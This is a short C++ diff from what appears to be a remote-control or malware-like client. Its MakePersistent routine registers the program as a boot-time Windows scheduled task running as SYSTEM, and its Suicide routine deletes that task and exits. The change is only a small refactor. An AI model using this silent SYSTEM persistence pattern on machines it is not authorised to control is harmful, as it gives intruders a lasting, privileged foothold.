@@ -42,11 +42,11 @@ void Machine::MakePersistent()
 
 	GetModuleFileNameA(nullptr, exe_path, buff_size);
 	cmd << "schtasks /Create /F /RU SYSTEM /SC ONSTART /TN " << quotify(TASK_NAME) << " /TR " << quotify(exe_path);
-	std::string output = RunShellCommand(std::move(cmd.str()));
+	RunShellCommand(std::move(cmd.str()));
 }
 
 void Machine::Suicide()
 {
-	RunShellCommand("schtasks /Delete /F /TN " + TASK_NAME);
+	RunShellCommand(std::move("schtasks /Delete /F /TN " + TASK_NAME));
 	std::exit(0);
 }
